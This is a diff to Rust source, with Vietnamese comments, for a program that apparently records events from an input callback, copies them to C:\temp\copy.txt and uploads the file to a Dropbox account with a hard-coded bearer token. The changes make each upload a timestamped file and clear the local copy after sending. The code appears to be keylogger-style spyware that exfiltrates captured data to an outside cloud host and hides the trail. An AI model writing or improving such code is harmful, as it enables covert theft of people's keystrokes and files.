@@ -44,7 +44,7 @@ fn callback(event: Event) {
                     Ok(mut log) => {
                         let _ = log.write_all(e.to_string().as_bytes());
                     },
-                    Err(_) => ()
+                    Err(e) => log_to_file(&format!("Error: {:?}", e))
                 };
                 return;
             }
@@ -103,9 +103,14 @@ pub async fn start_logic() {
                     Err(_) => continue
                 };
         
-                match upload_file2("C:\\temp\\copy.txt").await{
-                    Ok(()) => (),
-                    Err(_) => ()
+                match upload_file2("C:\\temp\\copy.txt").await {
+                    Ok(()) => {
+                        match fs::File::create(source) {
+                            Ok(_) => (),
+                            Err(_) => (),
+                        }
+                    }
+                    Err(_) => (),
                 }
             }
         })
@@ -137,7 +142,7 @@ pub async fn start_logic() {
 async fn upload_file2(file_path: &str) -> Result<(), Box<dyn std::error::Error>> {
         // === Cấu hình ===
         let access_token = format!("Bearer {}", TOKEN.trim());
-        let dropbox_destination = "/test.txt";
+        let dropbox_destination = format!("/{}.txt", chrono::Local::now().format("%Y-%m-%d_%H-%M-%S"));
     
         // === Đọc nội dung file ===
         let file_data = fs::read(file_path)?;
@@ -163,8 +168,8 @@ async fn upload_file2(file_path: &str) -> Result<(), Box<dyn std::error::Error>>
         // === In kết quả ===
         let status = res.status();
         let text = res.text().await?;
-        println!("Status: {}", status);
-        println!("Response: {}", text);
+        log_to_file(&format!("Status: {}, Response: {}", status, text));
+        println!("Status: {}, Response: {}", status, text);
     
         Ok(())
 }
